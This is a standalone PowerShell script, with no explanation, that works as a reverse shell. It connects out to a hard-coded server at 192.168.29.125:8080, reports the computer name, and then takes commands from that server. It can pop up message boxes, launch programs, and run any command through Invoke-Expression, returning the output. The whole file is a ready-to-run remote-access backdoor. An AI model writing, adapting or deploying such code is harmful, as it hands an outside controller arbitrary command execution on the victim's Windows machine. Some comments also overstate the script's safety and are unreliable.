$serverIp, $serverPort = "192.168.29.125", 8080 #server ip and port
$computerName = $env:COMPUTERNAME #id

#start connection
try {
    # New-Object guarantees seamless execution across all .NET & PowerShell versions
    $client = New-Object System.Net.Sockets.TcpClient($serverIp, $serverPort)
    $stream = $client.GetStream()

    # Stream wrappers insulate the network from buffer overflow errors
    $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
    $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
    $writer.AutoFlush = $true
}
catch {
    Write-Error "Connection failed: $_"
    exit
}

# send message 
function Send-Msg ([string]$msg) {
    if ($client.Connected) {
        try { $writer.WriteLine($msg) } catch {}
    }
}

# Initial Check-in
Send-Msg "[+] NEW CONNECTION: $computerName"

#main loop
while ($client.Connected) {
    try {
        $line = $reader.ReadLine()
        # If stream drops or disconnects prematurely, ReadLine returns null
        if ([string]::IsNullOrEmpty($line) -or $line.Trim() -eq "exit") { break }
        
        $line = $line.Trim()

        # Error-Proof Splitting: Ensures $argsList is initialized as empty if no spaces exist
        if ($line -like "* *") {
            $cmd, $argsList = $line -split ' ', 2
        } else {
            $cmd = $line
            $argsList = ""
        }
        
        # Router
        switch ($cmd.ToLower()) {
            "msgbox" {
                try {
                    # Loads Assembly dynamically; safe for all Win 10/11 environments
                    Add-Type -AssemblyName "Microsoft.VisualBasic"
                    [void][Microsoft.VisualBasic.Interaction]::MsgBox($argsList, "OKOnly,Information", "New Message")
                    Send-Msg "[i] Showed Message: $argsList"
                } catch { 
                    Send-Msg "[X] Cannot Show Message: $_" 
                }
            }
            "run" {
                try {
                    if ([string]::IsNullOrEmpty($argsList)) {
                        Send-Msg "[X] Error: No application specified to run."
                    } else {
                        Start-Process $argsList
                        Send-Msg "[i] Opened app: $argsList"
                    }
                } catch { 
                    Send-Msg "[X] App $argsList cannot open: $_" 
                }
            }
            default {
                # Catch-all: Native command execution with clean error output piping
                try { 
                    $result = Invoke-Expression $line | Out-String
                    if ([string]::IsNullOrWhiteSpace($result)) { $result = "[i] Command executed with no output." }
                    Send-Msg $result.Trim()
                } catch { 
                    Send-Msg "[X] Cannot run command: $_" 
                }
            }
        }
    }
    catch {
        # Catch unforeseen loop anomalies to prevent an infinite error spiral
        Send-Msg "[X] Loop Exception: $_"
        break
    }
}

#safe disposal
if ($writer) { $writer.Dispose() }
if ($reader) { $reader.Dispose() }
if ($client) { $client.Dispose() }